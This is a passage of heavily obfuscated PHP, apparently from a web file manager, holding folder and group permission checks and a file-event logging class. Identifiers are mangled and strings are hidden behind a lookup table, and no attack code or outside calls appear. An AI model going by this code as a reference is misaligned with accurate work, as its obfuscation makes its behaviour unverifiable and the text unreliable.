array_to_keyvalue_group($æíŠÌªª, $™Î¡³ß[411]); foreach ($Á‰Ã±«­ as $Ô¢î…ñ„ => $…èÀÜ²ş) { $û÷£ÑÎš = $this->authArrayCheck($…èÀÜ²ş, $è’ªúñî); if ($û÷£ÑÎš[$™Î¡³ß[423]] > 0) { $›±œé¯ƒ[] = $Ô¢î…ñ„ . $™Î¡³ß[12]; } } if ($Ù—»¡¦ø) { $ÚÍç²« = Model($™Î¡³ß[521]); foreach ($Ù—»¡¦ø as $’‹•†È‡) { $°Æ¾• = $ÚÍç²«->getInfo($’‹•†È‡); if (!$°Æ¾• || !is_array($°Æ¾•[$™Î¡³ß[87]])) { continue; } $›±œé¯ƒ[] = $°Æ¾•[$™Î¡³ß[87]][$™Î¡³ß[411]]; } } $Ô­°úŠ” = array(); $Ë£’ò¾‘ = $Ù—»¡¦ø; $÷º‰Ù¾ù = Model($™Î¡³ß[1338]); $ÚÍç²« = Model($™Î¡³ß[521]); $‹‰ÅÑä³ = array(); $˜ëÎæ¨† = array(); $¯Ò†•€ = array(); $ÜˆÔ–Ë = array(); if ($›±œé¯ƒ) { $¬³’ã = $÷º‰Ù¾ù->where(array($™Î¡³ß[411] => array($™Î¡³ß[427], $›±œé¯ƒ)))->select(); foreach ($¬³’ã as $ƒíçŠÓ) { $éÆ¼¶ÎÓ = $÷º‰Ù¾ù->parentLevelArray($ƒíçŠÓ[$™Î¡³ß[520]]); $Ô­°úŠ” = array_merge($Ô­°úŠ”, $éÆ¼¶ÎÓ); $Ë£’ò¾‘[] = $ƒíçŠÓ[$™Î¡³ß[505]]; $‹‰ÅÑä³[$ƒíçŠÓ[$™Î¡³ß[411]]] = $éÆ¼¶ÎÓ; $˜ëÎæ¨†[$ƒíçŠÓ[$™Î¡³ß[411]]] = $ƒíçŠÓ[$™Î¡³ß[505]]; } } $Ë£’ò¾‘ = array_values(array_unique($Ë£’ò¾‘)); $ÁæáÃíÀ = $Ë£’ò¾‘; foreach ($ÁæáÃíÀ as $’‹•†È‡) { $°Æ¾• = $ÚÍç²«->getInfo($’‹•†È‡); $éÆ¼¶ÎÓ = $÷º‰Ù¾ù->parentLevelArray($°Æ¾•[$™Î¡³ß[520]]); $Ë£’ò¾‘ = array_merge($Ë£’ò¾‘, $éÆ¼¶ÎÓ); } $Ë£’ò¾‘ = array_values(array_unique($Ë£’ò¾‘)); foreach ($Ë£’ò¾‘ as $’‹•†È‡) { $°Æ¾• = $ÚÍç²«->getInfo($’‹•†È‡); $Ô­°úŠ”[] = $°Æ¾•[$™Î¡³ß[87]][$™Î¡³ß[411]]; $¯Ò†•€[$’‹•†È‡] = $°Æ¾•[$™Î¡³ß[87]][$™Î¡³ß[411]]; $ÜˆÔ–Ë[$’‹•†È‡] = $÷º‰Ù¾ù->parentLevelArray($°Æ¾•[$™Î¡³ß[520]]); } foreach ($‹‰ÅÑä³ as $¢™’ÃÈİ => $¾Ÿ¡€Ö) { $âóı’˜— = $˜ëÎæ¨†[$¢™’ÃÈİ]; if (!$âóı’˜— || !$¯Ò†•€[$âóı’˜—]) { continue; } $ªŸÃ¯ = array(); foreach ($ÜˆÔ–Ë[$âóı’˜—] as $’‹•†È‡) { $ªŸÃ¯[] = $¯Ò†•€[$’‹•†È‡]; } $‹‰ÅÑä³[$¢™’ÃÈİ] = array_merge($ªŸÃ¯, $¾Ÿ¡€Ö); } $Ô­°úŠ” = array_values(array_unique($Ô­°úŠ”)); $¡ü²±ûì = array($™Î¡³ß[2046] => $Ô­°úŠ”, $™Î¡³ß[2047] => $‹‰ÅÑä³); $í…â¥ù[$è’ªúñî] = $¡ü²±ûì; return $¡ü²±ûì; } private function makeSourceAuth($‡ ®óáĞ, $ùœ„Ğù´, $èşß•†é = false) { $¼ÀŠ™æ© =& $_SERVER[Ó¡Ÿ§‚]; $¯úÙ±…¼ = $¼ÀŠ™æ©[88]; $¦æ«œ¤  = $‡ ®óáĞ[$¼ÀŠ™æ©[505]]; $™šÓ†¬ç = $‡ ®óáĞ[$¼ÀŠ™æ©[420]] == SourceModel::TYPE_GROUP; $î©ú‰´á = $™šÓ†¬ç ? $this->groupRootAuth($¦æ«œ¤ , $èşß•†é) : !1; if ($î©ú‰´á && Model($¼ÀŠ™æ©[507])->authCheckAction($î©ú‰´á[$¼ÀŠ™æ©[422]], $¼ÀŠ™æ©[1875])) { return $this->groupAuthInfo($î©ú‰´á, $¦æ«œ¤ ); } $÷Å¹ç§º = Model($¼ÀŠ™æ©[1338])->parentLevelArray($‡ ®óáĞ[$¼ÀŠ™æ©[520]]); $÷Å¹ç§º = array_merge(array($‡ ®óáĞ[$¼ÀŠ™æ©[411]]), array_reverse($÷Å¹ç§º)); $ğ‹¯øèÔ = !1; foreach ($÷Å¹ç§º as $¿ß¡ËØ) { if (!isset($ùœ„Ğù´[$¿ß¡ËØ])) { continue; } $”–ó½È® = $this->authMake($ùœ„Ğù´[$¿ß¡ËØ], $èşß•†é); if ($”–ó½È®[$¼ÀŠ™æ©[476]]) { $ğ‹¯øèÔ = $”–ó½È®; break; } } if (!$™šÓ†¬ç) { return $ğ‹¯øèÔ; } if (!$ğ‹¯øèÔ && $î©ú‰´á) { $ğ‹¯øèÔ = $this->groupAuthInfo($î©ú‰´á, $¦æ«œ¤ ); } if (!$ğ‹¯øèÔ) { $úãñ„›Ë = Model($¼ÀŠ™æ©[521])->getInfo($¦æ«œ¤ ); $‡‘Ç±ß = explode($¼ÀŠ™æ©[50], trim($úãñ„›Ë[$¼ÀŠ™æ©[520]], $¼ÀŠ™æ©[50])); $‡‘Ç±ß = array_reverse($‡‘Ç±ß); foreach ($‡‘Ç±ß as $Çß’©×) { if ($Çß’©× == $¼ÀŠ™æ©[198] || $Çß’©× == $¯úÙ±…¼) { continue; } $‹¬¡Œ÷’ = $this->groupRootAuth($Çß’©×, $èşß•†é); if (!$‹¬¡Œ÷’) { continue; } $ğ‹¯øèÔ = $this->groupAuthInfo($‹¬¡Œ÷’, $Çß’©×); break; } } if (!$ğ‹¯øèÔ || $ğ‹¯øèÔ[$¼ÀŠ™æ©[423]] <= 0) { $ÊÛ¾ßÉ– = $this->authDeepCheck($‡ ®óáĞ[$¼ÀŠ™æ©[411]], $èşß•†é); if ($ÊÛ¾ßÉ–) { $ğ‹¯øèÔ = $ÊÛ¾ßÉ–; } } return $ğ‹¯øèÔ; } private function userIsRoot($ñ©í¦ÑÖ = false) { $©¤İı× =& $_SERVER[Ó¡Ÿ§‚]; if (!$ñ©í¦ÑÖ && _get($GLOBALS, $©¤İı×[503])) { return !0; } $³ÖŒÎÕ¥ = Model($©¤İı×[534])->getInfo($ñ©í¦ÑÖ); $ÕÜßéğĞ = Model($©¤İı×[2055])->listData($³ÖŒÎÕ¥[$©¤İı×[1546]]); if ($ÕÜßéğĞ && $ÕÜßéğĞ[$©¤İı×[511]][$©¤İı×[2056]] == 1) { return !0; } return !1; } private function sourceAuthInfo($«…ıûÎè) { $Ğ¯¥öù =& $_SERVER[Ó¡Ÿ§‚]; $³¸Ô­Ü = Model($Ğ¯¥öù[1338]); $…İ¥¥ª = $³¸Ô­Ü->sourceInfo($«…ıûÎè); if (!$…İ¥¥ª) { return !1; } $³¸Ô­Ü->groupPathDisplay($…İ¥¥ª); $İô­²àç = array($…İ¥¥ª); $İô­²àç = $³¸Ô­Ü->_listAppendPath($İô­²àç); $…İ¥¥ª = $İô­²àç[0]; $É±ƒ‹–ê = $…İ¥¥ª[$Ğ¯¥öù[518]]; if (isset($…İ¥¥ª[$Ğ¯¥öù[526]])) { $”€‹ª•§ = explode($Ğ¯¥öù[8], trim($…İ¥¥ª[$Ğ¯¥öù[518]], $Ğ¯¥öù[8])); array_shift($”€‹ª•§); $É±ƒ‹–ê = $…İ¥¥ª[$Ğ¯¥öù[524]] . $Ğ¯¥öù[2057] . implode($Ğ¯¥öù[8], $”€‹ª•§); } return array($Ğ¯¥öù[429] => $…İ¥¥ª[$Ğ¯¥öù[32]], $Ğ¯¥öù[84] => KodIO::make($…İ¥¥ª[$Ğ¯¥öù[411]]), $Ğ¯¥öù[2058] => $É±ƒ‹–ê); } private function groupAuthInfo($¤Ô²ğò, $Â’ŠºæĞ) { $öá•“£ =& $_SERVER[Ó¡Ÿ§‚]; $ş¶ĞŞÜª = Model($öá•“£[521])->getInfo($Â’ŠºæĞ); return array($öá•“£[2059] => intval($¤Ô²ğò[$öá•“£[422]]), $öá•“£[2043] => $¤Ô²ğò, $öá•“£[2060] => LNG($öá•“£[2061]), $öá•“£[2052] => array($öá•“£[429] => $ş¶ĞŞÜª[$öá•“£[32]], $öá•“£[84] => KodIO::make($ş¶ĞŞÜª[$öá•“£[87]][$öá•“£[411]]), $öá•“£[2058] => $ş¶ĞŞÜª[$öá•“£[525]])); } protected function groupRootAuth($æÑú˜»¼, $ÃÌ²ˆëæ = false) { $€…‡Ğ–ô =& $_SERVER[Ó¡Ÿ§‚]; $ÃÌ²ˆëæ = $ÃÌ²ˆëæ ? $ÃÌ²ˆëæ : USER_ID; $ı«ê²¹µ = $ÃÌ²ˆëæ . $€…‡Ğ–ô[2062] . $æÑú˜»¼; static $Á ğ¤öç = array(); if (isset($Á ğ¤öç[$ı«ê²¹µ])) { return $Á ğ¤öç[$ı«ê²¹µ]; } $ù®®«òß = Model($€…‡Ğ–ô[521])->getInfo($æÑú˜»¼); $‹¥ì£²Ä = $this->userGroupList($ÃÌ²ˆëæ); $ˆ¼Âì³‚ = isset($‹¥ì£²Ä[$æÑú˜»¼]) ? $‹¥ì£²Ä[$æÑú˜»¼][$€…‡Ğ–ô[422]] : !1; if ($ˆ¼Âì³‚ && Model($€…‡Ğ–ô[507])->authCheckAction($ˆ¼Âì³‚[$€…‡Ğ–ô[422]], $€…‡Ğ–ô[1875])) { $Á ğ¤öç[$ı«ê²¹µ] = $ˆ¼Âì³‚; return $ˆ¼Âì³‚; } $¨ƒŒÆ·Ì = $this->sourceAuthSelect($ù®®«òß[$€…‡Ğ–ô[87]][$€…‡Ğ–ô[411]]); $îâë©æà = $¨ƒŒÆ·Ì ? $this->authMake($¨ƒŒÆ·Ì, $ÃÌ²ˆëæ) : !1; $Ñæøµˆš = $îâë©æà ? $îâë©æà[$€…‡Ğ–ô[476]] : !1; $Á ğ¤öç[$ı«ê²¹µ] = $Ñæøµˆš ? $Ñæøµˆš : $ˆ¼Âì³‚; return $Á ğ¤öç[$ı«ê²¹µ]; } public function authOwnerApply($œô”Ú™Ê) { $®¥•­ú =& $_SERVER[Ó¡Ÿ§‚]; if (empty($œô”Ú™Ê[$®¥•­ú[422]]) || isset($œô”Ú™Ê[$®¥•­ú[2063]]) && $œô”Ú™Ê[$®¥•­ú[2063]]) { return $œô”Ú™Ê; } if (AuthModel::authCheckRoot($œô”Ú™Ê[$®¥•­ú[422]][$®¥•­ú[423]])) { return $œô”Ú™Ê; } $åè³×Ê• = Model($®¥•­ú[1338])->parentLevelArray($œô”Ú™Ê[$®¥•­ú[520]]); $åè³×Ê• = array_merge(array($œô”Ú™Ê[$®¥•­ú[411]]), array_reverse($åè³×Ê•)); $¯ëéˆô = $this->sourceAuthSelect($åè³×Ê•); $àôá–³ = array(); $°ÑÛ€ÆÑ = array(); foreach ($¯ëéˆô as $üÀÕ‘İ => $„İ©¹•) { $şÛáÚÃİ = $this->authFolderOwnerUser($„İ©¹•); $àôá–³[$üÀÕ‘İ] = $şÛáÚÃİ; $°ÑÛ€ÆÑ = array_merge($°ÑÛ€ÆÑ, $şÛáÚÃİ[$®¥•­ú[599]]); if ($şÛáÚÃİ[$®¥•­ú[2064]]) { break; } } if (count($°ÑÛ€ÆÑ) == 0) { $°ÑÛ€ÆÑ = $this->authFolderOwnerGroup($œô”Ú™Ê[$®¥•­ú[505]]); } $°ÑÛ€ÆÑ = array_unique($°ÑÛ€ÆÑ); if (AuthModel::authCheckRoot($œô”Ú™Ê[$®¥•­ú[422]][$®¥•­ú[423]])) { $°ÑÛ€ÆÑ[] = USER_ID; } $œô”Ú™Ê[$®¥•­ú[422]][$®¥•­ú[2065]] = Model($®¥•­ú[513])->userListInfo($°ÑÛ€ÆÑ); return $œô”Ú™Ê; } private function authFolderOwnerGroup($†ìŠ‹µ‚) { $‚¡ÒËöä =& $_SERVER[Ó¡Ÿ§‚]; $üÖÄÓïâ = Model($‚¡ÒËöä[1944])->where(array($‚¡ÒËöä[1854] => $†ìŠ‹µ‚))->select(); $‡ı–ÑŠ = array(); if (!$üÖÄÓïâ) { return $‡ı–ÑŠ; } foreach ($üÖÄÓïâ as $ïÍ–ö‡Ø) { $‘¹•ƒßè = $this->authInfo($ïÍ–ö‡Ø); if (AuthModel::authCheckRoot($‘¹•ƒßè[$‚¡ÒËöä[422]])) { $‡ı–ÑŠ[] = $ïÍ–ö‡Ø[$‚¡ÒËöä[1665]]; } } return $‡ı–ÑŠ; } private function authFolderOwnerUser($©Ù¦³Š) { $šËŠ˜Ë‡ =& $_SERVER[Ó¡Ÿ§‚]; $îÇ¹ÍÙÌ = array(); $‘Ê’®ø = !1; foreach ($©Ù¦³Š as $éïšÖÆ€) { $Â®™Æ = $this->authInfo($éïšÖÆ€); if ($éïšÖÆ€[$šËŠ˜Ë‡[505]] == $šËŠ˜Ë‡[198]) { $‘Ê’®ø = !0; } if ($éïšÖÆ€[$šËŠ˜Ë‡[420]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Â®™Æ[$šËŠ˜Ë‡[422]])) { $îÇ¹ÍÙÌ[] = $éïšÖÆ€[$šËŠ˜Ë‡[505]]; } } } return array($šËŠ˜Ë‡[599] => $îÇ¹ÍÙÌ, $šËŠ˜Ë‡[2064] => $‘Ê’®ø); } public function authMake($úşÌÏèª, $¸£ÌÄÅ´ = false) { $›šâ–ô© =& $_SERVER[Ó¡Ÿ§‚]; $ĞãÏì–– = $this->authArrayCheck($úşÌÏèª, $¸£ÌÄÅ´); if ($ĞãÏì––[$›šâ–ô©[2066]]) { $ĞãÏì––[$›šâ–ô©[2066]] = $this->sourceAuthInfo($ĞãÏì––[$›šâ–ô©[2066]]); } return $ĞãÏì––; } public function authArrayCheck($Ü´‡ŒÕ¢, $˜Îç¯ß = false) { $Õ½û¨Î =& $_SERVER[Ó¡Ÿ§‚]; if (!$Ü´‡ŒÕ¢) { return array($Õ½û¨Î[423] => 0, $Õ½û¨Î[476] => !1); } $˜Îç¯ß = $˜Îç¯ß ? $˜Îç¯ß : USER_ID; $“ğÊÔ = 0; $•ÑŞæòÉ = 0; $Ğ„¼âØ¡ = 0; $“áÜû‚Ä = 0; $Á¤˜•É = 0; $³ÓãÂ­Á = 0; $ËûÆ©¯ = 1000; $”§èãŒÍ = 0; $×ö°¯Î = 0; $»¶¿–É¬ = 0; $ÃÌÏ§îó = 0; $€Õ±¦§ = array($Õ½û¨Î[411] => 0); foreach ($Ü´‡ŒÕ¢ as $€Õ±¦§) { $õìŠ›á = $this->authInfo($€Õ±¦§); if (!$õìŠ›á) { continue; } $°Ò‰¥¡ = $€Õ±¦§[$Õ½û¨Î[505]]; $á ù¦¿ä = intval($õìŠ›á[$Õ½û¨Î[422]]); if ($€Õ±¦§[$Õ½û¨Î[420]] == SourceModel::TYPE_USER && $°Ò‰¥¡ == $˜Îç¯ß) { $“ğÊÔ = !0; $Ğ„¼âØ¡ = $õìŠ›á; $•ÑŞæòÉ = $á ù¦¿ä; } else { if ($€Õ±¦§[$Õ½û¨Î[420]] == SourceModel::TYPE_GROUP && $this->groupContainUser($°Ò‰¥¡, $˜Îç¯ß)) { $“áÜû‚Ä = !0; $ÓíÔñË = $this->groupStepToUserGroup($°Ò‰¥¡, $˜Îç¯ß); if ($ÓíÔñË < $ËûÆ©¯) { $ËûÆ©¯ = $ÓíÔñË; $Á¤˜•É = $á ù¦¿ä; $³ÓãÂ­Á = $õìŠ›á; $”§èãŒÍ = $°Ò‰¥¡; } if ($ÓíÔñË == $ËûÆ©¯ && $á ù¦¿ä >= $Á¤˜•É) { $Á¤˜•É = $á ù¦¿ä; $³ÓãÂ­Á = $õìŠ›á; $”§èãŒÍ = $°Ò‰¥¡; } } else { if ($°Ò‰¥¡ == $Õ½û¨Î[198]) { $×ö°¯Î = !0; $ÃÌÏ§îó = $õìŠ›á; $»¶¿–É¬ = $á ù¦¿ä; } } } } if ($“ğÊÔ) { $òõ³âÂÎ = $•ÑŞæòÉ; $õìŠ›á = $Ğ„¼âØ¡; $Õ¤çø®¶ = LNG($Õ½û¨Î[2067]); } else { if ($“áÜû‚Ä) { $òõ³âÂÎ = $Á¤˜•É; $õìŠ›á = $³ÓãÂ­Á; $“Ú¾ÄÑ = Model($Õ½û¨Î[521])->getInfo($”§èãŒÍ); $Õ¤çø®¶ = $Õ½û¨Î[162] . $“Ú¾ÄÑ[$Õ½û¨Î[525]] . $Õ½û¨Î[2068] . LNG($Õ½û¨Î[2069]); } else { if ($×ö°¯Î) { $òõ³âÂÎ = $»¶¿–É¬; $õìŠ›á = $ÃÌÏ§îó; $Õ¤çø®¶ = LNG($Õ½û¨Î[2040]); } else { $òõ³âÂÎ = 0; $õìŠ›á = !1; $Õ¤çø®¶ = $Õ½û¨Î[12]; } } } $æ×ş°›Ü = array($Õ½û¨Î[2059] => intval($òõ³âÂÎ), $Õ½û¨Î[2043] => $õìŠ›á, $Õ½û¨Î[2060] => $Õ¤çø®¶, $Õ½û¨Î[2052] => $€Õ±¦§[$Õ½û¨Î[411]]); return $æ×ş°›Ü; } private function groupContainUser($£ÚÈ˜·ä, $ë•ºšÏ± = false) { return in_array($£ÚÈ˜·ä, $this->userGroupParents($ë•ºšÏ±)); } private function groupStepToUserGroup($ÖÜãŸÛ, $ïô™ñ¹½ = false) { $µ™Ø‘ƒŸ =& $_SERVER[Ó¡Ÿ§‚]; $ó°‡Õ¨ = $this->userGroupList($ïô™ñ¹½); $¶«¥¬Æ€ = 1000; $Ş¤‘¸èÍ = $GLOBALS[$µ™Ø‘ƒŸ[6]][$µ™Ø‘ƒŸ[89]][$µ™Ø‘ƒŸ[1957]] == 1; $âºšù—¿ = $Ş¤‘¸èÍ ? 3 : 2; foreach ($ó°‡Õ¨ as $ˆíÃ˜ûµ) { if ($ˆíÃ˜ûµ[$µ™Ø‘ƒŸ[1854]] == $ÖÜãŸÛ) { return 0; } $íÆßø˜’ = explode($µ™Ø‘ƒŸ[50], trim($ˆíÃ˜ûµ[$µ™Ø‘ƒŸ[520]], $µ™Ø‘ƒŸ[50])); if ($íÆßø˜’[0] == $µ™Ø‘ƒŸ[198] && count($íÆßø˜’) > $âºšù—¿) { $Èü£Óå = array_reverse(array_slice($íÆßø˜’, $âºšù—¿)); $‘¥Êù« = array_search($ÖÜãŸÛ, $Èü£Óå); if ($‘¥Êù« !== !1 && $‘¥Êù« + 1 <= $¶«¥¬Æ€) { $¶«¥¬Æ€ = $‘¥Êù« + 1; } } } return $¶«¥¬Æ€; } private function userGroupList($ÖÂ¡Ö÷­ = false) { $¾å¼ì«ü =& $_SERVER[Ó¡Ÿ§‚]; static $é‹Åâè’ = array(); if (isset($é‹Åâè’[$ÖÂ¡Ö÷­])) { return $é‹Åâè’[$ÖÂ¡Ö÷­]; } $¹µÍ¤Ç = Model($¾å¼ì«ü[534])->getInfo($ÖÂ¡Ö÷­); $é‹Åâè’[$ÖÂ¡Ö÷­] = array_to_keyvalue($¹µÍ¤Ç[$¾å¼ì«ü[2041]], $¾å¼ì«ü[1854]); return $é‹Åâè’[$ÖÂ¡Ö÷­]; } public function userGroupParents($å¶–«œ) { $˜ÃÂ¨ğÂ =& $_SERVER[Ó¡Ÿ§‚]; static $ÀËÕÌçÇ = array(); $å¶–«œ = $å¶–«œ ? $å¶–«œ : USER_ID; if (isset($ÀËÕÌçÇ[$å¶–«œ])) { return $ÀËÕÌçÇ[$å¶–«œ]; } $ñâåÓõ = $this->userGroupList($å¶–«œ); $öô‰ĞÍñ = array(); $ü÷ÔıªŒ = $GLOBALS[$˜ÃÂ¨ğÂ[6]][$˜ÃÂ¨ğÂ[89]][$˜ÃÂ¨ğÂ[1957]] == 1; $ãõÓ£”« = $ü÷ÔıªŒ ? 3 : 2; foreach ($ñâåÓõ as $™ÄÈ°³ñ) { $å‘ ¹ã = array($™ÄÈ°³ñ[$˜ÃÂ¨ğÂ[1854]]); $õùüõ« = explode($˜ÃÂ¨ğÂ[50], trim($™ÄÈ°³ñ[$˜ÃÂ¨ğÂ[520]], $˜ÃÂ¨ğÂ[50])); if ($õùüõ«[0] == $˜ÃÂ¨ğÂ[198] && count($õùüõ«) > $ãõÓ£”«) { $£Ç÷İœÔ = array_slice($õùüõ«, $ãõÓ£”«); $å‘ ¹ã = array_merge($å‘ ¹ã, array_reverse($£Ç÷İœÔ)); } $öô‰ĞÍñ = array_merge($öô‰ĞÍñ, $å‘ ¹ã); } $ÀËÕÌçÇ[$å¶–«œ] = array_unique($öô‰ĞÍñ); return $ÀËÕÌçÇ[$å¶–«œ]; } public function authTargetInfoMake($ßËˆÖ‘£) { $ˆ™ë¼™¹ =& $_SERVER[Ó¡Ÿ§‚]; $©’Çò­ = array(); $æŠŒÎÇÙ = array(); foreach ($ßËˆÖ‘£ as $ü¤ÁŸ½ş) { if ($ü¤ÁŸ½ş[$ˆ™ë¼™¹[420]] == SourceModel::TYPE_USER) { $©’Çò­[] = intval($ü¤ÁŸ½ş[$ˆ™ë¼™¹[505]]); } else { if ($ü¤ÁŸ½ş[$ˆ™ë¼™¹[420]] == SourceModel::TYPE_GROUP) { $æŠŒÎÇÙ[] = intval($ü¤ÁŸ½ş[$ˆ™ë¼™¹[505]]); } } } if ($©’Çò­) { $©’Çò­ = Model($ˆ™ë¼™¹[513])->userListInfo($©’Çò­); } if ($æŠŒÎÇÙ) { $Ó“ìêÕö = array($ˆ™ë¼™¹[1942] => array($ˆ™ë¼™¹[427], $æŠŒÎÇÙ)); $æŠŒÎÇÙ = Model($ˆ™ë¼™¹[521])->field($ˆ™ë¼™¹[2070])->where($Ó“ìêÕö)->select(); $æŠŒÎÇÙ = array_to_keyvalue($æŠŒÎÇÙ, $ˆ™ë¼™¹[1854]); } return array($ˆ™ë¼™¹[2071] => $©’Çò­, $ˆ™ë¼™¹[2072] => $æŠŒÎÇÙ); } public function authInfo($¦«êËØ) { $ÜóäÃµ· =& $_SERVER[Ó¡Ÿ§‚]; if ($¦«êËØ[$ÜóäÃµ·[1958]]) { $çäÍÃ˜ = Model($ÜóäÃµ·[507])->listData($¦«êËØ[$ÜóäÃµ·[1958]]); if (!$çäÍÃ˜) { return !1; $ëòÓ¢üó = Model($ÜóäÃµ·[507])->listData(); $ñÔ•½à = array_filter_by_field($ëòÓ¢üó, $ÜóäÃµ·[422], $ÜóäÃµ·[198]); return $ñÔ•½à; } $à€ ÚŠ = array_field_key($çäÍÃ˜, array($ÜóäÃµ·[399], $ÜóäÃµ·[32], $ÜóäÃµ·[422], $ÜóäÃµ·[1877], $ÜóäÃµ·[1878])); $à€ ÚŠ[$ÜóäÃµ·[2073]] = $¦«êËØ; return $à€ ÚŠ; } else { return array($ÜóäÃµ·[428] => 0, $ÜóäÃµ·[1860] => $¦«êËØ[$ÜóäÃµ·[2018]], $ÜóäÃµ·[429] => $ÜóäÃµ·[12], $ÜóäÃµ·[1877] => $ÜóäÃµ·[2074]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\165\x72\x63\145\x5f\145\166\x65\156\164"; protected $dataAuto = array(array("\143\x72\145\141\x74\x65\124\151\x6d\x65", "\x74\x69\155\145", "\x69\x6e\x73\145\x72\x74", "\146\165\156\x63\164\x69\157\156"), array("\x64\145\x73\143", '', "\x69\x6e\x73\145\x72\164\54\165\160\144\x61\164\145\x2c\x73\145\x6c\x65\x63\164", "\152\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($—áäÇ ‚, $ïÕô«Ó„, $åš„óÉ¶ = '') { $™Š¡ë‚Ş =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->eventSave) { return; } $±€“Ê²ï = Model($™Š¡ë‚Ş[1338])->sourceInfo($—áäÇ ‚); if (!$±€“Ê²ï) { return !1; } if ($this->isCacheEvent($±€“Ê²ï, $ïÕô«Ó„)) { return; } if ($åš„óÉ¶ && is_string($åš„óÉ¶)) { $åš„óÉ¶ = array($™Š¡ë‚Ş[1893] => $åš„óÉ¶); } $Ë³â³® = array($™Š¡ë‚Ş[426] => $—áäÇ ‚, $™Š¡ë‚Ş[2075] => $±€“Ê²ï[$™Š¡ë‚Ş[441]], $™Š¡ë‚Ş[2076] => $±€“Ê²ï[$™Š¡ë‚Ş[32]], $™Š¡ë‚Ş[518] => !empty($±€“Ê²ï[$™Š¡ë‚Ş[518]]) ? $±€“Ê²ï[$™Š¡ë‚Ş[518]] : $™Š¡ë‚Ş[12], $™Š¡ë‚Ş[1656] => USER_ID, $™Š¡ë‚Ş[431] => $ïÕô«Ó„, $™Š¡ë‚Ş[1658] => $åš„óÉ¶); $this->addSystemLog($ïÕô«Ó„, $Ë³â³®); unset($Ë³â³®[$™Š¡ë‚Ş[2076]], $Ë³â³®[$™Š¡ë‚Ş[518]]); return $this->add($Ë³â³®); } private function addSystemLog($îÖŞÆñû, $Õ…½ÙŠ) { $¾ÑÚêšë =& $_SERVER[Ó¡Ÿ§‚]; if ($îÖŞÆñû == $¾ÑÚêšë[2077]) { $îÖŞÆñû = $Õ…½ÙŠ[$¾ÑÚêšë[462]][$¾ÑÚêšë[2078]]; } else { if (in_array($îÖŞÆñû, array($¾ÑÚêšë[1834], $¾ÑÚêšë[2079]))) { $îÖŞÆñû = $Õ…½ÙŠ[$¾ÑÚêšë[462]][$¾ÑÚêšë[753]]; } } $ö€®¾½ø = array_merge($Õ…½ÙŠ, array($¾ÑÚêšë[2080] => $Õ…½ÙŠ[$¾ÑÚêšë[411]], $¾ÑÚêšë[2081] => $Õ…½ÙŠ[$¾ÑÚêšë[2081]])); Hook::trigger($¾ÑÚêšë[2082], $¾ÑÚêšë[2083] . $îÖŞÆñû, $Õ…½ÙŠ); Model($¾ÑÚêšë[1798])->addLog($¾ÑÚêšë[2083] . $îÖŞÆñû, $ö€®¾½ø); } private function isCacheEvent($ÃœäóÙ¿, $•Ï½›‘ø) { if ($ÃœäóÙ¿[$_SERVER[Ó¡Ÿ§‚][420]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($áÄ‘õì, $ğ«˜»¿) { $ŒÑôâ‡ı =& $_SERVER[Ó¡Ÿ§‚]; $£…ŠŸª° = Model($ŒÑôâ‡ı[1338])->sourceInfo($áÄ‘õì); $•¯¢˜ô = array($ŒÑôâ‡ı[2078] => $ğ«˜»¿, $ŒÑôâ‡ı[32] => $£…ŠŸª°[$ŒÑôâ‡ı[32]]); return $this->addEvent($áÄ‘õì, $ŒÑôâ‡ı[2077], $•¯¢˜ô); } public function eventFileEdit($µÂôë–á) { $ÙÚ²İ¸· =& $_SERVER[Ó¡Ÿ§‚]; $¡¶ğ—Ó‹ = array($ÙÚ²İ¸·[2084] => $_SERVER[$ÙÚ²İ¸·[2085]], $ÙÚ²İ¸·[2086] => strtolower(ACTION)); if (isset($GLOBALS[$ÙÚ²İ¸·[7]][$ÙÚ²İ¸·[2087]])) { $¡¶ğ—Ó‹[$ÙÚ²İ¸·[2087]] = $ÙÚ²İ¸·[88]; } return $this->addEvent($µÂôë–á, $ÙÚ²İ¸·[1824], $¡¶ğ—Ó‹); } public function eventRecycle($Ê’Úõå¾, $ÛÔë‰ğĞ) { return $this->addEvent($Ê’Úõå¾, $_SERVER[Ó¡Ÿ§‚][2079], $ÛÔë‰ğĞ); } public function eventRemove($«®ó¤¯”) { $óòú—ÚÃ =& $_SERVER[Ó¡Ÿ§‚]; $ÙÌğîãÁ = Model($óòú—ÚÃ[1338])->sourceInfo($«®ó¤¯”); $ †‚¶Ö = $ÙÌğîãÁ[$óòú—ÚÃ[32]]; return $this->addEvent($ÙÌğîãÁ[$óòú—ÚÃ[441]], $óòú—ÚÃ[1823], $ †‚¶Ö); } public function eventShare($»Ë­’çº, $…İ¾ÏÜÒ) { return $this->addEvent($»Ë­’çº, $_SERVER[Ó¡Ÿ§‚][1834], $…İ¾ÏÜÒ); } public function eventMove($íÀ’á¹³, $ä§¡Í×¹, $×­æÖ) { $…¾èßÁš =& $_SERVER[Ó¡Ÿ§‚]; $ÕëÉ×” = Model($…¾èßÁš[1338]); $˜´ÎŒË² = $ÕëÉ×”->sourceInfo($íÀ’á¹³); $Ûôù¢ˆ = $ÕëÉ×”->sourceInfo($ä§¡Í×¹); $É·˜ö²— = $ÕëÉ×”->sourceInfo($×­æÖ); $úûí€£ = array($…¾èßÁš[1159] => $ä§¡Í×¹, $…¾èßÁš[2088] => $Ûôù¢ˆ[$…¾èßÁš[32]], $…¾èßÁš[2066] => !empty($Ûôù¢ˆ[$…¾èßÁš[518]]) ? $Ûôù¢ˆ[$…¾èßÁš[518]] : $…¾èßÁš[12], $…¾èßÁš[1160] => $×­æÖ, $…¾èßÁš[2089] => $É·˜ö²—[$…¾èßÁš[32]], $…¾èßÁš[2090] => !empty($É·˜ö²—[$…¾èßÁš[518]]) ? $É·˜ö²—[$…¾èßÁš[518]] : $…¾èßÁš[12]); $this->addEvent($íÀ’á¹³, $…¾èßÁš[557], $úûí€£); $˜´ÎŒË² = $ÕëÉ×”->sourceInfo($íÀ’á¹³); $úûí€£ = array($…¾èßÁš[411] => $˜´ÎŒË²[$…¾èßÁš[411]], $…¾èßÁš[32] => $˜´ÎŒË²[$…¾èßÁš[32]]); $this->addEvent($ä§¡Í×¹, $…¾èßÁš[2091], $úûí€£); } public function 